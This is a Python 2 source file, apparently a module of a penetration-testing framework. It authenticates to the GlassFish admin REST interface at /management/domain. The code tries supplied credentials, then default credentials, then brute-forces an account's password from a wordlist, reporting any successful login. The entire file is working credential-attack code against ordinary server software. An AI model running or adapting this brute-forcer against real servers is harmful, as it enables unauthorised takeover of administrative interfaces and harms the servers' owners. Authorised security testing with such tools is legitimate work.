from src.platform.glassfish.interfaces import GINTERFACES
from requests.auth import HTTPBasicAuth
from requests.utils import dict_from_cookiejar
from collections import OrderedDict
from log import LOG
from sys import stdout
import state
import utility


default_credentials = []
def _auth(usr, pswd, url):
    """ Authentication is trivially obtained via the admin REST interface
    """

    res = utility.requests_get(url, auth=HTTPBasicAuth(usr, pswd))
    if res.status_code is 200:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return HTTPBasicAuth(usr, pswd)


def checkAuth(ip, port, title):
    """
    """

    if title == GINTERFACES.GAD:

        url = 'http://{0}:{1}/management/domain'.format(ip, port)

        # check with given auth
        if state.usr_auth:
            (usr, pswd) = state.usr_auth.split(':')
            return _auth(usr, pswd, url)

        # else try default creds
        for (usr, pswd) in default_credentials:
            cook = _auth(usr, pswd, url)
            if cook:
                return cook

        # check for a supplied wordlist
        if state.bf_wordlist and not state.hasbf:

            state.hasbf = True
            wordlist = []
            with open(state.bf_wordlist, "r") as f:
                wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

            utility.Msg("Brute forcing %s account with %d passwords..." %
                            (state.bf_user, len(wordlist)), LOG.DEBUG)

            try:
                for (idx, word) in enumerate(wordlist):
                    stdout.flush()
                    stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"
                                    % (utility.timestamp(), state.bf_user, idx+1, len(wordlist)))

                    cook = _auth(state.bf_user, word, url)
                    if cook:
                        print ''

                        if not (state.bf_user, word) in default_credentials:
                            default_credentials.insert(0, (state.bf_user, word))
                        
                        utility.Msg("Successful login %s:%s" % (state.bf_user, word),
                                                               LOG.SUCCESS)
                        return cook

                print ''

            except KeyboardInterrupt:
                pass
